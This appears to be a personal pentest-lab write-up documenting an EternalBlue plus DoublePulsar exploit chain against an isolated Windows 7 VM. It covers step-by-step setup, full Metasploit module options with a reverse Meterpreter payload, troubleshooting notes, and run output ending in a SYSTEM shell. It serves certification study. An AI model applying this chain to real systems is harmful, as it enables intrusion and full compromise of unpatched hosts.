# Home Pentest Lab: DoublePulsar Backdoor Implant (chained with EternalBlue)

> Second lab in my personal practice series, continuing directly from my [EternalBlue (MS17-010) lab](../kali-win7-eternalblue-lab) — same isolated Kali + Windows 7 environment. Built as part of my cybersecurity certification roadmap (ISC2 CC) and the *Complete Ethical Hacking Bootcamp* (Zero To Mastery).

## Overview

| | |
|---|---|
| **Attacker** | Kali Linux (VirtualBox) |
| **Target** | Windows 7 Ultimate SP1 x64 (VirtualBox, unpatched, isolated) |
| **Module** | [Telefonica/Eternalblue-Doublepulsar-Metasploit](https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit) (custom Metasploit module) |
| **Network** | Host-only (isolated) + NAT (internet access for Kali only) |
| **Objective** | Plant the DoublePulsar backdoor implant via the MS17-010 vulnerability and deliver a Meterpreter payload at SYSTEM privilege level |

## 1. Why This Needs Wine + Python 2

Unlike a pure Metasploit module, this specific exploit chain relies on the original NSA/Shadow Brokers DoublePulsar tooling internally, which generates its payload DLL and SMB trigger packets using a Python 2 script with Windows-specific `ctypes` calls. Those calls only resolve correctly inside a Windows-like environment — so the module shells out to a **Python 2.7 interpreter running inside a Wine prefix** on Kali, rather than native Linux Python.

## 2. Setup Steps (and the real troubleshooting)

### 2.1 Installing Wine + 32-bit support

Needed `wine32:i386` specifically (not just `wine`), since Python 2.7's Windows installer is a 32-bit application:

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine wine32:i386 -y
```

**Issue hit:** the Kali-packaged Wine repeatedly failed with internal RPC/OLE errors (`StdMarshalImpl_MarshalInterface Failed to create ifstub`, `setupapi:do_file_copyW Unsupported style(s) 0x10`) even after a clean reinstall. **Fix:** switched to the official WineHQ repository instead of Kali's bundled packages:

```bash
sudo apt remove --purge wine* -y && sudo apt autoremove -y && rm -rf ~/.wine
sudo mkdir -pm755 /etc/apt/keyrings
sudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key
sudo wget -NP /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/debian/dists/bookworm/winehq-bookworm.sources
sudo apt update
sudo apt install --install-recommends winehq-stable -y
```

### 2.2 Installing Python 2.7 under Wine

**Critical detail:** downloaded `python-2.7.14.amd64.msi` (64-bit) by mistake. Since Wine was configured with `wine32:i386` for 32-bit compatibility, this mismatch caused silent/cryptic failures (file-not-found errors, "Unsupported style" errors during install). **Fix:** used the correct 32-bit installer instead:

```bash
cd ~/Downloads
wget https://www.python.org/ftp/python/2.7.14/python-2.7.14.msi   # no "amd64" in the name
wine msiexec /i python-2.7.14.msi
```

Chose **"Install for all users"** and kept the default path (`C:\Python27\`). Confirmed with:
```bash
ls ~/.wine/drive_c/Python27/
```

**Important:** Wine commands must be run as your normal user, not root — Wine creates its prefix (`~/.wine`) relative to whoever runs it, so running as root would install Python into `/root/.wine` instead of the user's own prefix, which the Metasploit module (and the user running `msfconsole`) would then fail to find.

### 2.3 Registering the Metasploit module

```bash
git clone https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit.git
cd Eternalblue-Doublepulsar-Metasploit
mkdir -p ~/.msf4/modules/exploits/windows/smb/
cp eternalblue_doublepulsar.rb ~/.msf4/modules/exploits/windows/smb/
msfconsole
reload_all
use exploit/windows/smb/eternalblue_doublepulsar
```

## 3. Final `show options` — every parameter, explained

| Option | Value used | Why |
|---|---|---|
| `DOUBLEPULSARPATH` | `/home/kali/Desktop/Eternalblue-Doublepulsar-Metasploit/deps/` | Path to the repo's `deps/` folder (DoublePulsar XML templates + DLLs). Must point to wherever the repo was actually cloned — **not** the module's hardcoded default of `/root/...`, since the repo was cloned as a normal user, not root. |
| `ETERNALBLUEPATH` | `/home/kali/Desktop/Eternalblue-Doublepulsar-Metasploit/deps/` | Same `deps/` folder — EternalBlue's XML templates/binaries live alongside DoublePulsar's in this repo. |
| `PROCESSINJECT` | `lsass.exe` | The Windows process DoublePulsar injects its payload DLL into. Default is `wlms.exe` (used for x86 targets per the module's own description — *"Change to lsass.exe for x64"*); since the target is a 64-bit Windows 7, this had to be changed explicitly. |
| `RHOSTS` | `<TARGET_IP>` | Target IP — the Windows 7 VM, reachable only through the isolated host-only network. |
| `RPORT` | `445` (default) | SMB port — where the MS17-010 vulnerability is exposed. |
| `TARGETARCHITECTURE` | `x64` | Must match the target OS architecture exactly. Module defaults to `x86`; since the ISO used was Windows 7 **x64**, this had to be changed, and it determines which payload DLL gets generated. |
| `WINEPATH` | `/home/kali/.wine/drive_c/` | Path to the Wine prefix's virtual `C:\` drive containing the Python 2.7 install. **Caught a bug here:** since `msfconsole` was being run as root, this defaulted to `/root/.wine/drive_c/` — the wrong prefix, since Python 2.7 was installed under the normal user's Wine prefix, not root's. Had to override explicitly. |
| `PAYLOAD` | `windows/x64/meterpreter/reverse_tcp` | Must match target architecture — module defaults to the 32-bit `windows/meterpreter/reverse_tcp`, which had to be swapped for the x64 variant. |
| `LHOST` | `<ATTACKER_IP>` | Kali's own IP **on the host-only network**, not its NAT IP (`<KALI_NAT_IP>`) — the target needs to reach this address to call back, and it can only do so over the isolated lab network. |
| `LPORT` | `4444` (default) | Listener port for the reverse Meterpreter connection. |
| `EXITFUNC` | `process` (default) | Exit technique for the payload process — left at default. |
| Exploit target | `8 — Windows 7 (all services pack) (x86)(x64)` | Matches the target OS family; the module auto-selects architecture-specific behavior based on `TARGETARCHITECTURE` above. |

## 4. Bugs chased that turned out to be typos

Worth documenting honestly: several "failures" during this lab were not technical issues at all —

- `RHOSTS`/`LHOST` were repeatedly mistyped as `192.168.**.x` instead of `192.168.**.x`, and `LHOST` once as `<ATTACKER_IP_TYPO2>` (an extra digit). Both caused `run` to fail with a misleading `[-] Handler failed to bind` and `Oops, something was wrong!` that looked like exploit-level problems.
- `DOUBLEPULSARPATH`/`ETERNALBLUEPATH` were once `set` in a regular bash shell instead of inside `msfconsole` — bash accepted the command silently (as its own unrelated `set` builtin) without actually configuring the Metasploit module.

**Lesson:** when a parameter-dependent exploit fails, `show options` before `run` — character by character — before assuming the vulnerability itself is the problem.

## 5. Result

```
msf exploit(windows/smb/eternalblue_doublepulsar) > run
[*] Started reverse TCP handler on <ATTACKER_IP>:4444
[*] <TARGET_IP>:445 - Generating Eternalblue XML data
[*] <TARGET_IP>:445 - Generating Doublepulsar XML data
[*] <TARGET_IP>:445 - Generating payload DLL for Doublepulsar
[*] <TARGET_IP>:445 - Writing DLL in /home/kali/.wine/drive_c/eternal11.dll
[*] <TARGET_IP>:445 - Launching Eternalblue ...
[*] <TARGET_IP>:445 - Launching Doublepulsar ...
[*] Meterpreter session opened (<ATTACKER_IP>:4444 -> <TARGET_IP>)

meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

Session opened with **NT AUTHORITY\SYSTEM** privileges — the highest privilege level on Windows.

## 6. Key Takeaways

- DoublePulsar is a *post*-exploitation implant that rides on top of the EternalBlue (MS17-010) vulnerability — it's not a standalone bug, it's a delivery mechanism layered on the same SMB flaw documented in my first lab.
- Architecture mismatches (x86 vs. x64) cascade through every layer of this exploit chain: the Python installer, the Wine prefix, `TARGETARCHITECTURE`, `PROCESSINJECT`, and `PAYLOAD` all have to agree, or the exploit fails in ways that look unrelated to architecture at first glance.
- Most of the real debugging time here went into distinguishing "this is genuinely broken" from "I mistyped something" — a skill that matters as much as understanding the exploit mechanics themselves.

---
*Disclaimer: All testing performed in a fully isolated, personally-owned VirtualBox lab environment for educational purposes as part of a structured cybersecurity certification path. No real-world or third-party systems were involved.*
